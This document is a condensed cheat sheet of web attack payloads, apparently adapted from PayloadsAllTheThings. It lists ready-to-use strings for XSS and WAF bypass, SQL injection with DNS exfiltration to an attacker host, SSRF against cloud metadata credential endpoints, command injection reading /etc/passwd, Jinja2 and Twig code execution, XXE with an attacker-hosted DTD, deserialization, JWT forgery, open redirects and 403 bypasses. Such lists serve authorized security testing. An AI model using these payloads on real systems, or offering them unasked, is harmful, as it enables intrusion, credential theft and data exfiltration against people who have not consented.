# Payload & Bypass Cheat Sheet

Condensed from PayloadsAllTheThings (64+ categories). For full lists: fetch `@payloads-all-the-things` → category README.md.

## Context selection matrix

| Context | Approach |
|---|---|
| HTML body | `<script>`, event handlers (`onerror`, `onload`), `<img src=x onerror=…>` |
| Attribute | close quote `"><svg onload=…>` ; event handlers |
| JS string | break out `' -alert(1)- '` ; template literal `` `${alert(1)}` `` |
| URL param | URL-encode, double-encode; `javascript:` for redirects |
| JSON | keep valid JSON + escape: `{"x":"\";alert(1)//"}` |
| CSS | expression (legacy IE), `url()` exfil, attr() |
| Template engine | detect engine first: `{{7*7}}` / `${7*7}` / `<%= 7*7 %>` |

## XSS

- Basic: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, `<svg/onload=alert(1)>`, `<body onload=…>`, `<iframe srcdoc=…>`.
- Filter bypass: case mixing, null bytes, entities (`&#x61;lert`), double encoding, event-handler variants (`onerror`, `onmouseover`, `onfocus autofocus`), tag allowlist evasion (`<details open ontoggle=…>`, `<marquee onstart=…>`).
- WAF bypass by vendor (Cloudflare/Akamai/Imperva/Wordfence): split payload across params, mutation XSS, script gadgets (Angular/Vue/jQuery sinks), JSONP callback injection.
- Blind XSS: out-of-band listeners (webhook/BXSS manager) in admin fields (User-Agent, comment, support ticket, email templates).

## SQL injection

- Union: `ORDER BY n` to find column count → `' UNION SELECT NULL,NULL-- -`.
- Boolean blind: `' AND 1=1-- -` vs `' AND 1=2-- -`.
- Time blind: MySQL `SLEEP(5)`, MSSQL `WAITFOR DELAY`, PostgreSQL `pg_sleep`.
- OOB: `LOAD_FILE('//attacker/x')`, `xp_cmdshell` (MSSQL), DNS exfil (`LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))`).
- WAF bypass: comments (`/*!50000UNION*/`), case, whitespace alternatives (`%09`, `%0a`, `/**/`), encoding, scientific notation, JSON/HTTP parameter pollution.

## NoSQL injection

- Operators: `{"username": {"$gt": ""}, "password": {"$gt": ""}}` auth bypass.
- `$where` JS execution, aggregation pipeline injection, duplicate key override (`{"$gt":1,"$gt":1}`) when WAF strips operators.

## SSRF

- Targets: `169.254.169.254` metadata paths:
  - AWS: `/latest/meta-data/iam/security-credentials/`
  - GCP: `Metadata-Flavor: Google` header + `/computeMetadata/v1/…`
  - Azure: `169.254.169.254/metadata/instance` with `Metadata: true`
- Bypasses: decimal/hex IP (`2130706433`), short IP (`127.1`), DNS rebinding, redirect chains (302 to internal), URL parser confusion (`@`, `#`, `\`), IPv6 (`[::1]`), cloud metadata via `metadata.google.internal`.
- Protocols: `gopher://`, `dict://`, `file://` where supported.

## Command injection

- Separators: `;`, `|`, `||`, `&&`, `%0a` newline.
- Spaceless: `$IFS`, `{cat,/etc/passwd}`, `< /etc/passwd`, tab (`%09`).
- Time: `sleep 5` / `ping -c 5`.
- Bypass WAF: wildcards (`c?a?t`), XOR/base64 constructs, `$@`, `\` line continuation.

## SSTI (detect → engine → payload)

- Detect: `{{7*7}}` → 49 = Jinja2/Twig; `${7*7}` → 49 = Mako/Java EL; `<%= %>` → ERB; `{{= }}` → Pug.
- Jinja2 RCE: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or `{{cycler.__init__.__globals__.os.popen('id').read()}}`.
- Twig RCE: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`.

## Path traversal / LFI

- Basic: `../../../../etc/passwd`, `..%2f..%2f`, `%2e%2e%2f`, `....//....//`.
- PHP wrappers: `php://filter/convert.base64-encode/resource=index.php`, `phar://`, `zip://`, `data://text/plain,<?php …?>`, `expect://`.
- LFI→RCE: `/proc/self/environ` + User-Agent, log files, session upload, `pearcmd` argument injection, `input` wrapper with POST body.

## XXE

- File read: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`.
- Blind/OOB: external DTD on attacker server; parameter entities `<!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">`.
- SSRF via `http://` entities; SVG/XLSX/JAR vector files.

## Deserialization

- Java: ysoserial payloads (`CommonsCollections`, `URLDNS` for out-of-band detection).
- PHP: `O:4:"User":1:{s:4:"pass";s:3:"md5";}` crafted objects; phar meta deserialization.
- Python pickle: reduce chain to `os.system`.
- Node: `node-serialize` `{"rce":"_$$ND_FUNC$$_function(){…}"}`.

## JWT attacks

- `alg: none` (empty signature); RS256→HS256 (sign with public key as HMAC secret); weak secret brute force; claim tampering (`role: admin`); `kid` path traversal to known key file.

## OAuth / redirect

- `redirect_uri` bypass: `https://app.com/callback/../../../evil`, `https://app.com.evil.com`, open-redirect on allowlist subdomain, `@` userinfo, fragment manipulation.

## Open redirect

- `//evil.com`, `/\evil.com`, `https://evil.com`, `///evil.com`, `https:%2f%2fevil.com`, `@` userinfo (`https://good.com@evil.com`), backslash `https://evil.com\`.

## Race condition payloads (Turbo Intruder sketch)

```
def queueRequests(target, wordlist):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            requestsPerConnection=1,
                            pipeline=False)
    for i in range(50):
        engine.queue(target.req, target.baseRequest.getResponse)
```
Or HTTP/2 single-packet attack for simultaneous in-flight requests.

## WAF bypass general techniques

Encoding (URL/Unicode/double), case variation, comment insertion, chunked transfer, HTTP parameter pollution, method override (`X-HTTP-Method-Override`), path normalization tricks (`..;/`), header injection, splitting payload across multiple params, polymorphic content types.

## 401/403 bypass quick list

- Path: `/admin` → `/Admin`, `/%61dmin`, `/admin/`, `/admin.json`, `/./admin`, `//admin`, `/admin;`, `/admin%20`.
- Headers: `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-For: 127.0.0.1`, `X-Custom-IP-Authorization`, `Host` override, `Referer` from same host.
- Methods: GET↔POST↔PUT↔PATCH↔HEAD↔OPTIONS; `X-HTTP-Method-Override`.
